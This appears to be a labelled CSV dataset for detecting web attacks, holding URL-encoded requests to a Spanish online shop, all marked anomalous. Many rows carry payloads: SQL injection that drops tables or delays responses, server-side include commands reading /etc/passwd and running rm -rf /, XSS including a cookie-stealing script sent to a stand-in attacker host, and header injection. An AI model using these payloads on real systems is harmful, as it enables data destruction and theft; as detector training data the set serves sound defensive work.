text,method,label
modo=registro&login=millaire&password=pintoja&nombreA=Ceciliano&apellidos=Ballest%E9+Carranza&email=wagenhiem_hollingsworth%40eddydaniele.museum&dni=27857756H&direccion=Calle+Luis+Mila+23+10%3FA&ciudad=Guadalupe&cp=09500&provincia=Salamanca&ntc=2397290594537988&B1=Registrar,GET,anomalous
modo=registro&login=nitin&password=r4mitir&nombre=Lionel&apellidos=Teixidor+Modrego&email=creach%40vindexexpo.gr&dni=37118814B&direccion=C%2F+Joaquin+Arjona+70%2C+&ciudad=Rionegro+del+Puente&cp=49639&provincia=Barcelona&ntc=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Registrar,GET,anomalous
modo=registro&login=nitin&password=r4mitir&nombre=Lionel&apellidos=Nume%2Fros+*Mayo_ral&email=creach%40vindexexpo.gr&dni=37118814B&direccion=C%2F+Joaquin+Arjona+70%2C+&ciudad=Rionegro+del+Puente&cp=49639&provincia=Barcelona&ntc=8651464575981410&B1=Registrar,GET,anomalous
modo=registro&login=nitin&password=r4mitir&nombre=Lionel&apellidos=Teixidor+Modrego&email=creach%40vindexexpo.gr&dniA=37118814B&direccion=C%2F+Joaquin+Arjona+70%2C+&ciudad=Rionegro+del+Puente&cp=49639&provincia=Barcelona&ntc=8651464575981410&B1=Registrar,GET,anomalous
id=2&nombre=Queso+Manchego&precio=39&cantidad=%27+DELETE+FROM+USERS&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Queso+Manchego&precio=39%2F&cantidad=74&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Queso+Manchego&precio=39&cantidad=74&B1A=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=frants&pwd=g8Vi%27ll3&remember=on&B1=Entrar,GET,anomalous
modo=insertar&precio=2445%3F&B1=Confirmar,GET,anomalous
modo=insertar&precio=2445&B1=Confirmar%2F,GET,anomalous
modo=insertar&precio=2445&B1A=Confirmar,GET,anomalous
modo=registrosessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&login=calley&password=posTIfijO&nombre=Naiara&apellidos=Baldo+Urra&email=wildhagen_cavender%40hotelestopsecret.kp&dni=91334515C&direccion=Calle+En+Corts+130%2C+2%3FA&ciudad=Jaul%EDn&cp=04280&provincia=%C1vila&ntc=4540479003454435&B1=Registrar,GET,anomalous
modo=registro&login=calley&password=posTIfijO&nombre=Naiara&apellidos=Baldo+Urra&email=wildhagen_cavender%40hotelestopsecret.kp&dni=91334515C&direccion=%2520&ciudad=Jaul%EDn&cp=04280&provincia=%C1vila&ntc=4540479003454435&B1=Registrar,GET,anomalous
modo=registro&login=calley&password=posTIfijO&nombre=Naiara&apellidos=Baldo+Urra&email=wildhagen_cavender%40hotelestopsecret.kp&dni=91334515C&direccion=Calle+En+Corts+130%2C+2%3FA&ciudad=Jaul%EDn&cp=04280&provincia=%C1vila&ntc=014456114990265&B1=Registrar,GET,anomalous
modo=registro&login=calley&password=posTIfijO&nombre=Naiara&apellidos=Baldo+Urra&email=wildhagen_cavender%40hotelestopsecret.kp&dniA=91334515C&direccion=Calle+En+Corts+130%2C+2%3FA&ciudad=Jaul%EDn&cp=04280&provincia=%C1vila&ntc=4540479003454435&B1=Registrar,GET,anomalous
modo=registro&login=vinet%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&password=REl%2BatOr%CDA&nombre=Ihor&apellidos=Bedos&email=sangareau%40faders.com.mil&dni=74830064R&direccion=Santa+Agueda%2C+S%2FN+5%3FG&ciudad=Zarza+de+Mont%E1nchez&cp=28191&provincia=Ja%E9n&ntc=9112082229252110&B1=Registrar,GET,anomalous
modo=registro&login=vinet&password=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&nombre=Ihor&apellidos=Bedos&email=sangareau%40faders.com.mil&dni=74830064R&direccion=Santa+Agueda%2C+S%2FN+5%3FG&ciudad=Zarza+de+Mont%E1nchez&cp=28191&provincia=Ja%E9n&ntc=9112082229252110&B1=Registrar,GET,anomalous
id=3&nombre=Queso+Manchego&precio=39&cantidad=86&B1=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,GET,anomalous
id=3&nombre=Queso+Manchego&precio=100%2F&cantidad=86&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Queso+Manchego&precio=39&cantidad=86&B1A=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=ayse&pwd=quillotrar&remember=on%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=Entrar,GET,anomalous
modo=entrar&login=ayse&pwd=quillotrar&remember=off%2F&B1=Entrar,GET,anomalous
modo=entrar&login=ayse&pwdA=quillotrar&remember=on&B1=Entrar,GET,anomalous
modo=insertar&precio=6857&B1=Confirmar,PUT,anomalous
modo=insertar&precio=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Confirmar,GET,anomalous
modo=insertar&precio=6857&B1=Confirmar%2F,GET,anomalous
modo=insertar&precioA=6857&B1=Confirmar,GET,anomalous
modo=registro&login=mo%2Brson&password=c44dE96&nombre=Orestes&apellidos=Amargant&email=el2%40campanasextractoras.py&dni=57728968A&direccion=Calle+Salado%2C+148%2C+6%3FF&ciudad=Valderrobres&cp=16236&provincia=Girona&ntc=1272142225716686&B1=Registrar,GET,anomalous
modoA=registro&login=kari&password=c44dE96&nombre=Orestes&apellidos=Amargant&email=el2%40campanasextractoras.py&dni=57728968A&direccion=Calle+Salado%2C+148%2C+6%3FF&ciudad=Valderrobres&cp=16236&provincia=Girona&ntc=1272142225716686&B1=Registrar,GET,anomalous
modo=registro&login=novelia&password=gener7ble&nombre=Mahoma&apellidos=Armend%E1riz+Velichcanich&email=ku-chine%40lawn.mc&dni=09557832K&direccion=Travesia+Ramon+Ba%F1os%2C+15%2C+10G&ciudad=Oliana&cp=22367&provincia=Ja%E9n&ntc=5511433905621846&B1=Registrar,PUT,anomalous
modo=registro&login=novelia%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&password=gener7ble&nombre=Mahoma&apellidos=Armend%E1riz+Velichcanich&email=ku-chine%40lawn.mc&dni=09557832K&direccion=Travesia+Ramon+Ba%F1os%2C+15%2C+10G&ciudad=Oliana&cp=22367&provincia=Ja%E9n&ntc=5511433905621846&B1=Registrar,GET,anomalous
modo=registro&login=novelia&password=gener7ble&nombre=Mahoma&apellidos=Armend%E1riz+Velichcanich&email=ku-chine%40lawn.mc&dni=09557832K&direccion=Travesia+Ramon+Ba%F1os%2C+15%2C+10G&ciudad=Mal*uen%3Fd%3Fa&cp=22367&provincia=Ja%E9n&ntc=5511433905621846&B1=Registrar,GET,anomalous
modo=registro&login=novelia&password=gener7ble&nombre=Mahoma&apellidos=Armend%E1riz+Velichcanich&email=ku-chine%40lawn.mc&dni=09557832K&direccion=Travesia+Ramon+Ba%F1os%2C+15%2C+10G&ciudad=Oliana&cp=22367&provinciaA=Ja%E9n&ntc=5511433905621846&B1=Registrar,GET,anomalous
id=2&nombre=Jam%F3n+Ib%E9rico%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=100&cantidad=43&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Vino+.*%3FRioja&precio=100&cantidad=43&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidadA=43&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=dion&pwd=tric%F3tomo&remember=off&B1=Entrar,PUT,anomalous
modo=entrar%2500&login=dion&pwd=tric%F3tomo&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=dion&pwd=tric%F3tomo&remember=off%2F&B1=Entrar,GET,anomalous
modo=entrar&loginA=dion&pwd=tric%F3tomo&remember=off&B1=Entrar,GET,anomalous
modo=insertar&precio=6875&B1=Confirmar%2F,GET,anomalous
modo=insertar&precioA=6875&B1=Confirmar,GET,anomalous
modo=registro&login=cesario&password=cAseIFiCAr&nombre=Serena&apellidos=Torn%E9s+Tallado&email=koltai%40ubuybetter.sa&dni=28497948M&direccion=Angel+11%2C+7H&ciudad=Cantallops&cp=1883A&provincia=Girona&ntc=5977636857808544&B1=Registrar,GET,anomalous
modoA=registro&login=cesario&password=cAseIFiCAr&nombre=Serena&apellidos=Torn%E9s+Tallado&email=koltai%40ubuybetter.sa&dni=28497948M&direccion=Angel+11%2C+7H&ciudad=Cantallops&cp=19133&provincia=Girona&ntc=5977636857808544&B1=Registrar,GET,anomalous
modo=registro&login=pebrook&password=i8OL6L%2C18%EDa&nombre=Edgar&apellidos=Sumariva+Santamar%EDa&email=rosanova-angelo%40dissident.mm&dni=43646821C&direccion=Via+Complutense%2C+76%2C+&ciudad=Miguelturra&cp=09390&provincia=Palencia&ntc=8153377554882034&B1=Registrar,GET,anomalous
modo=registro&login=pebrook&password=5ica7er1&nombre=Edgar&apellidos=Sumariva+Santamar%EDa&email=rosanova-angelo%40dissident.mm&dni=43646821C&direccion=Via+Complutense%2C+76%2C+&ciudadA=Miguelturra&cp=09390&provincia=Palencia&ntc=8153377554882034&B1=Registrar,GET,anomalous
id=2%257C&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=25&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Jam%F3n+Ib%E9rico&precio=85%2F&cantidad=25&B1=A%F1adir+al+carrito,GET,anomalous
modoA=entrar&login=milty&pwd=hebr6ico&remember=off&B1=Entrar,GET,anomalous
modo=insertar&precio=715&B1=Pasar+por+caja%27+DELETE+FROM+USERS,GET,anomalous
modo=insertar&precio=715&B1=Confirmar%2F,GET,anomalous
modo=insertar&precio=715&B1A=Pasar+por+caja,GET,anomalous
modo=registro&login=kapil&password=d1c36o4ca&nombre=Berina+del+Valle&apellidos=Artico&email=meunier.langa%40tintasultravioleta.al&dni=17826694S&direccion=C%2F+Historiador+Rodrigo+Pertegas%2C+149%2C+8-E&ciudad=Palafolls%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=25218&provincia=C%E1ceres&ntc=3256313581077416&B1=Registrar,GET,anomalous
modo=registro&login=kapil&password=d1c36o4ca&nombre=Berina+del+Valle&apellidos=Artico&email=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&dni=17826694S&direccion=C%2F+Historiador+Rodrigo+Pertegas%2C+149%2C+8-E&ciudad=Palafolls&cp=25218&provincia=C%E1ceres&ntc=3256313581077416&B1=Registrar,GET,anomalous
modo=registro&login=kapil&password=cAR1%2F95Gr74O&nombre=Berina+del+Valle&apellidos=Artico&email=meunier.langa%40tintasultravioleta.al&dni=17826694S&direccion=C%2F+Historiador+Rodrigo+Pertegas%2C+149%2C+8-E&ciudad=Palafolls&cp=25218&provincia=C%E1ceres&ntc=3256313581077416&B1=Registrar,GET,anomalous
modo=registro&login=kapil&password=d1c36o4ca&nombre=Berina+del+Valle&apellidos=Artico&email=meunier.langa%40tintasultravioleta.al&dni=17826694S&direccion=C%2F+Historiador+Rodrigo+Pertegas%2C+149%2C+8-E&ciudad=Palafolls&cp=25218&provincia=C%E1ceres&ntc=3256313581077416&B1A=Registrar,GET,anomalous
modo=registro&login=%2Bkunja%2Bl&password=L63um2&nombre=Grazia&apellidos=Carstens&email=daele_roddan%40comonuevo.gg&dni=98695672G&direccion=Viriato+170%2C+&ciudad=Pinarnegrillo&cp=07810&provincia=M%E1laga&ntc=3975543619812448&B1=Registrar,GET,anomalous
modo=registro&login=liesie&password=L63um2&nombreA=Grazia&apellidos=Carstens&email=daele_roddan%40comonuevo.gg&dni=98695672G&direccion=Viriato+170%2C+&ciudad=Pinarnegrillo&cp=07810&provincia=M%E1laga&ntc=3975543619812448&B1=Registrar,GET,anomalous
id=1&nombre=Vino+Rioja&precio=100&cantidad=40%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=A%F1adir+al+carrito,GET,anomalous
id=1&nombre=Vino+.*%3FRioja&precio=100&cantidad=40&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=storm%252B&pwd=527aD2&remember=off&B1=Entrar,GET,anomalous
modo=%4040&login=storm&pwd=527aD2&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=storm&pwd=527aD2&remember=on%2F&B1=Entrar,GET,anomalous
modo=entrar&login=storm&pwdA=527aD2&remember=off&B1=Entrar,GET,anomalous
modo=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=9468&B1=Pasar+por+caja,GET,anomalous
modo=insertar&precio=9468&B1=Pasar+por+caja%2F,GET,anomalous
modoA=insertar&precio=9468&B1=Pasar+por+caja,GET,anomalous
modo=registro&login=waverley&password=sal&nombre=Soledad&apellidos=Cadi%F1anos+Batalla&email=connelly%40librodeapuntes.ae&dni=87996424B&direccion=Algodre+66%2C+&ciudad=Plan&cp=03430&provincia=Navarra&ntc=8615233836935718&B1=Registrar,PUT,anomalous
modo=registro&login=waverley&password=sal&nombre=Soledad&apellidos=Cadi%F1anos+Batalla&email=connelly%40librodeapuntes.ae&dni=87996424B&direccion=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&ciudad=Plan&cp=03430&provincia=Navarra&ntc=8615233836935718&B1=Registrar,GET,anomalous
modo=registro&login=waverley&password=sal&nombre=Soledad&apellidos=Cadi%F1anos+Batalla&email=connelly%40librodeapuntes.ae&dni=87996424B&direccion=Algodre+66%2C+&ciudad=Plan&cp=03430&provincia=.To%3Fledo&ntc=8615233836935718&B1=Registrar,GET,anomalous
modo=registro&login=waverley&password=sal&nombre=Soledad&apellidos=Cadi%F1anos+Batalla&email=connelly%40librodeapuntes.ae&dni=87996424B&direccion=Algodre+66%2C+&ciudad=Plan&cp=03430&provincia=Navarra&ntc=8615233836935718&B1A=Registrar,GET,anomalous
modo=registro&login=koolstra&password=oRdenaNte&nombre=Ivo&apellidos=Herrero+Barberis&email=briers.lester%40decsl.pt&dni=56149521N&direccion=Av.+Valdecilla%2C+86+&ciudad=Cheste&cp=1247A&provincia=Tarragona&ntc=0452979446378052&B1=Registrar,GET,anomalous
modo=registro&login=koolstra&password=oRdenaNte&nombre=Ivo&apellidos=Herrero+Barberis&email=briers.lester%40decsl.pt&dni=56149521N&direccion=Av.+Valdecilla%2C+86+&ciudad=Cheste&cp=24855&provincia=Tarragona&ntcA=0452979446378052&B1=Registrar,GET,anomalous
id=1&nombre=Queso+Manchego&precio=100&cantidad=%27+DELETE+FROM+USERS&B1=A%F1adir+al+carrito,GET,anomalous
id=1&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=100&cantidad=94&B1=A%F1adir+al+carrito,GET,anomalous
id=1&nombreA=Queso+Manchego&precio=100&cantidad=94&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=cushing&pwd=614n3r9&remember=off&B1=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,GET,anomalous
modo=entrar&login=cushing&pwd=614n3r9&remember=on%2F&B1=Entrar,GET,anomalous
modo=entrar&login=cushing&pwd=614n3r9&remember=off&B1A=Entrar,GET,anomalous
modo=insertar&precio=8036any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Pasar+por+caja,GET,anomalous
modo=insertar&precio=8036&B1=Pasar+por+caja%2F,GET,anomalous
modo=insertar&precio=8036&B1A=Pasar+por+caja,GET,anomalous
modo=registro&login=nill&password=2739n83d%2446&nombre=Yael&apellidos=Paladell+Perramon&email=brandauer%40barnicesuv.td&dni=31914466B&direccion=Calle+Corpo+Santo%2C+11+6G&ciudad=Canales+de+la+Sierra&cp=22220&provincia=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&ntc=3350910813018179&B1=Registrar,GET,anomalous
modo=registro&login=nill&password=2739n83d%2446&nombre=S%2Binibald%27o&apellidos=Paladell+Perramon&email=brandauer%40barnicesuv.td&dni=31914466B&direccion=Calle+Corpo+Santo%2C+11+6G&ciudad=Canales+de+la+Sierra&cp=22220&provincia=Cantabria&ntc=3350910813018179&B1=Registrar,GET,anomalous
modo=registro&login=nill&password=2739n83d%2446&nombre=Yael&apellidos=Paladell+Perramon&email=brandauer%40barnicesuv.td&dni=31914466B&direccion=Calle+Corpo+Santo%2C+11+6G&ciudad=Canales+de+la+Sierra&cp=22220&provincia=Cantabria&ntc=3350910813018179&B1A=Registrar,GET,anomalous
B2=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,GET,anomalous
modo=registro&login=yurik&password=a4orrachada&nombre=Rock&apellidos=Morales+Urgell&email=golabek%40joll.cf&dni=24231534E&direccion=Plegadero+Alto+48%2C+&ciudad=Alf%E0s+del+Pi%2C+l%27&cp=13120any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&provincia=Cuenca&ntc=7817403668944119&B1=Registrar,GET,anomalous
modo=registro&login=yurik&password=a4orrachada&nombre=Rock&apellidos=Morales+Urgell&email=golabek%40joll.cf&dni=63BB304028R&direccion=Plegadero+Alto+48%2C+&ciudad=Alf%E0s+del+Pi%2C+l%27&cp=13120&provincia=Cuenca&ntc=7817403668944119&B1=Registrar,GET,anomalous
modo=registro&login=yurik&password=a4orrachada&nombre=Rock&apellidosA=Morales+Urgell&email=golabek%40joll.cf&dni=24231534E&direccion=Plegadero+Alto+48%2C+&ciudad=Alf%E0s+del+Pi%2C+l%27&cp=13120&provincia=Cuenca&ntc=7817403668944119&B1=Registrar,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%27INJECTED_PARAM&cantidad=38&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39%2F&cantidad=38&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombreA=Jam%F3n+Ib%E9rico&precio=100&cantidad=38&B1=A%F1adir+al+carrito,GET,anomalous
modo=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&login=darb2&pwd=h4_Bi651A2&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=%3F%2Bmaccon%2Fai&pwd=h4_Bi651A2&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=darb2&pwdA=h4_Bi651A2&remember=on&B1=Entrar,GET,anomalous
modo=insertar%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&precio=4179&B1=Confirmar,GET,anomalous
modo=insertar&precio=4179&B1A=Confirmar,GET,anomalous
modo=registro&login=winters&password=pat%21entemente&nombre=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&apellidos=Mollejasl&email=wepper.cros%40miplat.kh&dni=91976235V&direccion=Calle+San+Froilan+74+&ciudad=San+Miguel+de+Bernuy&cp=06410&provincia=Barcelona&ntc=3866167824231022&B1=Registrar,GET,anomalous
modo=registro&login=winters&password=pat%21entemente&nombre=%2FNaq%2C%27u&apellidos=Mollejasl&email=wepper.cros%40miplat.kh&dni=91976235V&direccion=Calle+San+Froilan+74+&ciudad=San+Miguel+de+Bernuy&cp=06410&provincia=Barcelona&ntc=3866167824231022&B1=Registrar,GET,anomalous
modo=registro&login=winters&password=pat%21entemente&nombre=Romildo&apellidos=Mollejasl&email=wepper.cros%40miplat.kh&dni=91976235V&direccion=Calle+San+Froilan+74+&ciudadA=San+Miguel+de+Bernuy&cp=06410&provincia=Barcelona&ntc=3866167824231022&B1=Registrar,GET,anomalous
modo=registro&login=schloboh&password=e229dado&nombre=%22+AND+%221%22%3D%221&apellidos=Cresp%ED+Zarzosa&email=lune-dulier%40natravea.py&dni=51098953Z&direccion=Av.+Pedro+Mata%2C+S%2FN+8%3FF&ciudad=Ataun&cp=24367&provincia=%C1vila&ntc=2333052430103872&B1=Registrar,GET,anomalous
modo=registro&login=schloboh&password=e229dado&nombre=Ce-lso&apellidos=Cresp%ED+Zarzosa&email=lune-dulier%40natravea.py&dni=51098953Z&direccion=Av.+Pedro+Mata%2C+S%2FN+8%3FF&ciudad=Ataun&cp=24367&provincia=%C1vila&ntc=2333052430103872&B1=Registrar,GET,anomalous
modo=registro&login=schloboh&password=e229dado&nombre=Obsulia&apellidosA=Cresp%ED+Zarzosa&email=lune-dulier%40natravea.py&dni=51098953Z&direccion=Av.+Pedro+Mata%2C+S%2FN+8%3FF&ciudad=Ataun&cp=24367&provincia=%C1vila&ntc=2333052430103872&B1=Registrar,GET,anomalous
id=2&nombre=Queso+Manchego&precio=85%2F&cantidad=32&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Queso+Manchego&precio=85&cantidadA=32&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=carmelo&pwd=CIcEroNe&remember=off&B1=Entrar%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,GET,anomalous
modo=entrar&login=%3Fva%2Frennes&pwd=CIcEroNe&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=carmelo&pwd=CIcEroNe&rememberA=off&B1=Entrar,GET,anomalous
modo=insertar&precio=1543&B1=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,GET,anomalous
modo=insertar&precio=1543&B1=Confirmar%2F,GET,anomalous
modo=insertar&precioA=1543&B1=Confirmar,GET,anomalous
modo=registro&login=kaleena2&password=InMEMO2ial&nombre=Nazareth&apellidos=Daniel+Barquin&email=ferco-stanczak%40%40noviast%40eresapa%40lacios.kw&dni=08092387K&direccion=Glorieta+Arabial+S%2FN%2C+10%3FD&ciudad=Pedrera&cp=40314&provincia=Soria&ntc=9093119555934526&B1=Registrar,GET,anomalous
modo=registro&login=kaleena2&password=InMEMO2ial&nombre=Nazareth&apellidos=Daniel+Barquin&email=kommerell%40ajuntamentbarcelona2-0.com&dni=08092387K&direccion=Glorieta+Arabial+S%2FN%2C+10%3FD&ciudad=Pedrera&cp=40314&provinciaA=Soria&ntc=9093119555934526&B1=Registrar,GET,anomalous
modo=registro&login=clarita&password=2e720lOn7r%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Quirico&apellidos=Mart%EDnez&email=goodier_igus%40catanoticias.sd&dni=37035771K&direccion=Avenida+Casado+Del+Alisal%2C+70+&ciudad=Santa+Eulalia+Bajera&cp=42311&provincia=Tarragona&ntc=9017290902673113&B1=Registrar,GET,anomalous
modo=registro&login=clarita&password=2e720lOn7r&nombre=Quirico&apellidos=Mart%EDnez&email=goodier_igus%40catanoticias.sd&dni=37035771K&direccion=Avenida+Casado+Del+Alisal%2C+70+&ciudad=Caspue%F1a%2Fs&cp=42311&provincia=Tarragona&ntc=9017290902673113&B1=Registrar,GET,anomalous
modo=registro&login=clarita&password=2e720lOn7r&nombre=Quirico&apellidos=Mart%EDnez&email=goodier_igus%40catanoticias.sd&dni=37035771K&direccionA=Avenida+Casado+Del+Alisal%2C+70+&ciudad=Santa+Eulalia+Bajera&cp=42311&provincia=Tarragona&ntc=9017290902673113&B1=Registrar,GET,anomalous
id=2&nombre=Vino+Rioja&precio=39%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&cantidad=98&B1=A%F1adir+al+carrito,GET,anomalous
id=3%2F&nombre=Vino+Rioja&precio=39&cantidad=98&B1=A%F1adir+al+carrito,GET,anomalous
idA=2&nombre=Vino+Rioja&precio=39&cantidad=98&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=chandras%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=h%2Bolgona&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=chandras&pwd=h%2Bolgona&remember=%3F&B1=Entrar,GET,anomalous
modo=entrar&login=kon*omis&pwd=h%2Bolgona&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=chandras&pwd=h%2Bolgona&remember=on&B1A=Entrar,GET,anomalous
modo=insertar&precio=9499&B1=Confirmar%2F,GET,anomalous
modo=insertar&precioA=9499&B1=Confirmar,GET,anomalous
modo=registro&login=laurie6&password=as2%C9Ni7A&nombre=Stavros&apellidos=Freixas+Mata&email=algan%40introito.tr&dni=49372725M&direccion=Fortaleza+Hacho+199+11H&ciudad=Sevilla&cp=09249&provincia=Badajoz&ntc=0043177554706627&B1=Registrar%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,GET,anomalous
modo=registro&login=laurie6&password=as2%C9Ni7A&nombre=Stavros&apellidos=Freixas+Mata&email=algan%40introito.tr&dni=49372725M&direccion=Fortaleza+Hacho+199+11H&ciudad=Sevilla&cpA=09249&provincia=Badajoz&ntc=0043177554706627&B1=Registrar,GET,anomalous
modo=registro&login=pardo&password=S2r44n9sa&nombre=%27+DELETE+FROM+USERS&apellidos=Abad+Palomo&email=alonzo%40colorprint.eh&dni=44696230P&direccion=Pl.+Primero+De+Mayo+S%2FN%2C+11F&ciudad=Albal%E1&cp=29493&provincia=Soria&ntc=1165920681066048&B1=Registrar,GET,anomalous
modo=registro&login=pardo&password=S2r44n9sa&nombre=Julius&apellidos=Abad+Palomo&email=alonzo%40colorprint.eh&dni=44696230P&direccion=Pl.+Primero+De+Mayo+S%2FN%2C+11F&ciudad=Albal%E1&cpA=29493&provincia=Soria&ntc=1165920681066048&B1=Registrar,GET,anomalous
id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Vino+Rioja&precio=39&cantidad=6&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=39&cantidad=6&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Vino+Rioja&precio=39&cantidadA=6&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=foster&pwd=8se7i961o&remember=off&B1=Entrar,PUT,anomalous
modo=entrar&login=foster&pwd=8se7i961o&remember=off&B1=Entrarany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,GET,anomalous
modo=entrar&login=foster&pwd=8se7i961o&remember=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Entrar,GET,anomalous
modo=entrar&login=foster&pwd=l%2FEt%2C%2CaRg-O&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=foster&pwd=8se7i961o&rememberA=off&B1=Entrar,GET,anomalous
modo=insertar&precio=3650%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Confirmar,GET,anomalous
modo=insertar&precio=3650&B1=Confirmar%2F,GET,anomalous
